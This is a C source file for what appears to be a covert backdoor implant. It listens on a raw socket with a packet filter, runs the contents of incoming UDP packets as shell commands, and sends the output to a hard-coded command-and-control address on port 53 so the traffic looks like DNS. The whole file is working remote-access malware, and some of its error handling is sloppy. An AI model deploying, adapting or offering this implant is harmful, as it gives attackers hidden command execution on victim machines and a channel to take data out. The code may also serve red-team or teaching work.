#ifndef IFACE
#define IFACE "ens33"
#endif
#ifndef SRC_PORT
#define SRC_PORT 55316
#endif
#ifndef DST_PORT
#define DST_PORT 53
#endif

#include "wildfire.h"


/*
 * As a note, this portion of the codebase would not be possible without 
 * the amazing contribution of Jamie Geiger on the watershell project.
 * To see that project go to https://github.com/wumb0/watershell .
 *
**/
char *get_udp_packet_and_run_cmd(){
    int sockfd, i, n, hlen, arg;
    struct sock_fprog filter;
    char buf[2048];
    unsigned char *read;
    char *udpdata, *iface = IFACE;
    struct iphdr *ip;
    struct udphdr *udp;
    unsigned port = SRC_PORT;
    int code = 0;

    // replace the port in the existing filter
    bpf_code[5].k = port;
    bpf_code[7].k = port;
    bpf_code[15].k = port;
    bpf_code[17].k = port;

    /* startup a raw socket, gets raw ethernet frames containing IP packets
     * directly from the interface, none of this AF_INET shit
     */
    sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP));
    if (sockfd < 0){
        return;
    }

    //apply the packet filter code to the socket
    filter.len = 20;
    filter.filter = bpf_code;
    if (setsockopt(sockfd, SOL_SOCKET, SO_ATTACH_FILTER, &filter, sizeof(filter)) < 0){
        return;
    }

    memset(buf, 0, 2048);
    //get a packet, and tear it apart, look for keywords
    n = recvfrom(sockfd, buf, 2048, 0, NULL, NULL);
	
    ip = (struct iphdr *)(buf + sizeof(struct ethhdr));
    udp = (struct udphdr *)(buf + ip->ihl*4 + sizeof(struct ethhdr));
    udpdata = (char *)((buf + ip->ihl*4 + 8 + sizeof(struct ethhdr)));


    printf("%s\n", udpdata);
    int out = open("/dev/null", O_WRONLY);
    int err = open("/dev/null", O_WRONLY);
    dup2(out, 0);
    dup2(err, 2);
            
    FILE *fd;
    fd = popen(udpdata, "r");
    if (!fd) return;
 
    char buffer[256];
    size_t chread;
    /* String to store entire command contents in */
    size_t comalloc = 256;
    size_t comlen   = 0;
    char *comout   = malloc(comalloc);
 
    /* Use fread so binary data is dealt with correctly */
    while ((chread = fread(buffer, 1, sizeof(buffer), fd)) != 0) {
        if (comlen + chread >= comalloc) {
            comalloc *= 2;
            comout = realloc(comout, comalloc);
        }
        memmove(comout + comlen, buffer, chread);
        comlen += chread;
    }
    pclose(fd);
    return comout;
}

uint16_t checksum(uint8_t *data, unsigned int size){
    int i;
    int sum = 0;
    uint16_t *p = (uint16_t *)data;

    for(i = 0; i < size; i += 2){
        sum += *(p++);
    }

    uint16_t carry = sum >> 16;
    uint16_t tmp = 0x0000ffff & sum;
    uint16_t res = ~(tmp + carry);

    return res;
}

// For little endian
struct pseudo_iphdr{
    uint32_t source_addr;
    uint32_t dest_addr;
    uint8_t zeros;
    uint8_t prot;
    uint16_t length;
};

unsigned int build_ip_packet(struct in_addr src_addr, struct in_addr dst_addr, uint8_t protocol, uint8_t *ip_packet, uint8_t *data, unsigned int data_size){
    struct iphdr *ip_header;

    ip_header = (struct iphdr *)ip_packet;
    ip_header->version = 4;
    ip_header->ihl = INET_HDR_LEN;
    ip_header->tos = 0;
    ip_header->tot_len = htons(INET_HDR_LEN * 4 + data_size);
    ip_header->id = 0;
    ip_header->frag_off = 0;
    ip_header->ttl = 64;
    ip_header->protocol = protocol;
    ip_header->check = 0;
    ip_header->saddr = src_addr.s_addr;
    ip_header->daddr = dst_addr.s_addr;

    memcpy(ip_packet + sizeof(struct iphdr), data, data_size);

    return sizeof(struct iphdr) + data_size;
}


#define MAX_PSEUDO_PKT_SIZE 1024

unsigned int build_udp_packet(struct sockaddr_in src_addr, struct sockaddr_in dst_addr, uint8_t *udp_packet, uint8_t *data, unsigned int data_size){
    uint8_t pseudo_packet[MAX_PSEUDO_PKT_SIZE];
    uint16_t length;
    struct udphdr *udph;
    struct pseudo_iphdr *p_iphdr = (struct pseudo_iphdr *)pseudo_packet;

    length = UDP_HDR_SIZE + data_size;
    udph = (struct udphdr *)udp_packet;
    udph->source = src_addr.sin_port;
    udph->dest = dst_addr.sin_port;
    udph->len = htons(length);
    memcpy(udp_packet + UDP_HDR_SIZE, data, data_size);

    if(length + sizeof(struct pseudo_iphdr) > MAX_PSEUDO_PKT_SIZE){
        fprintf(stderr, "Buffer size not enough");
        exit(1);
    }

    // Calculate checksum with pseudo ip header
    p_iphdr->source_addr = src_addr.sin_addr.s_addr;
    p_iphdr->dest_addr = dst_addr.sin_addr.s_addr;
    p_iphdr->zeros = 0;
    p_iphdr->prot = IPPROTO_UDP; //udp
    p_iphdr->length = udph->len;

    // Do NOT use udph->len instead of length.
    // udph->len is in big endian
    memcpy(pseudo_packet + sizeof(struct pseudo_iphdr), udph, length);
    udph->check = checksum(pseudo_packet, sizeof(struct pseudo_iphdr) + length);

    return length;
}


void send_udp_packet(char *dst_host, char *payload){
    int raw_sock;
    uint8_t packet[ETH_DATA_LEN];
    uint8_t udp_packet[ETH_DATA_LEN];
    uint8_t data[MAX_DATA_SIZE];
    unsigned int packet_size;
    unsigned int data_size;
    struct sockaddr_in src_addr;
    struct sockaddr_in dst_addr;
    int flag = 1;
    unsigned int ip_payload_size;


    // get IP of interface
    int fd;
    struct ifreq ifr;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, IFACE, IFNAMSIZ-1);
    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);
    char *src_host = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);




    src_addr.sin_family = AF_INET;
    src_addr.sin_port = htons(SRC_PORT);
    inet_aton(src_host, &src_addr.sin_addr);

    dst_addr.sin_family = AF_INET;
    dst_addr.sin_port = htons(DST_PORT);
    inet_aton(dst_host, &dst_addr.sin_addr);

    data_size = strlen(payload);
    strncpy((char *)data, payload, (data_size < MAX_DATA_SIZE) ? data_size : MAX_DATA_SIZE);
    data_size = strlen((char *)data);

    if((raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0){
        perror("socket");
        exit(1);
    }

    memset(packet, 0, ETH_DATA_LEN);
    ip_payload_size = build_udp_packet(src_addr, dst_addr, packet + sizeof(struct iphdr), data, data_size);

    packet_size = build_ip_packet(src_addr.sin_addr, dst_addr.sin_addr, IPPROTO_UDP, packet, packet + sizeof(struct iphdr), ip_payload_size);

    // Maybe this is not needed
    // IP_HDRINCL option is enabled implicitly when IPPROTO_RAW
    if (setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &flag, sizeof(flag)) < 0) {
        perror("setsockopt");
        exit(1);
    }

    if(sendto(raw_sock, packet, packet_size, 0, (struct sockaddr *)&dst_addr, sizeof(dst_addr)) < 0){
        perror("sendto");
        exit(1);
    }
}

void send_udp_packet_unlimited(char *dst_host, char *payload){
    size_t payload_len = strlen(payload);
    size_t num_packets = (payload_len / MAX_DATA_SIZE) + 1;
    int i;
    for(i = 0; i < num_packets; i++){
        send_udp_packet(dst_host, (payload+(i*MAX_DATA_SIZE)));
    }
}

int main(int argc, char *argv[]){
    char *C2_address = "192.168.58.129";
    char * output = get_udp_packet_and_run_cmd();
    send_udp_packet_unlimited(C2_address, output);
    return 0;
}
